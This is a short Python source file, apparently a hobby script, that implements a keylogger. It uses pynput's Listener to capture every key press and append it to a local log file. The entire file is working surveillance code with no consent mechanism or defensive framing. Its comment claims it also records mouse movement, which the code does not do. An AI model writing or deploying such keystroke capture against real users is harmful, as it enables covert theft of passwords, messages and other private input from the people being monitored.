from pynput.keyboard import Listener
# Note: pynput cannot control the keyboard and mouse within the same file, this requires double imports

# Program stores key strokes and mouse movement within log file

# Append
def appendtofile(key):
    letter = str(key)
    letter = letter.replace("'",'')
    with open('keylogger/log.txt','a') as f:
        f.write(letter)



with Listener(on_press=appendtofile) as l:
    l.join()

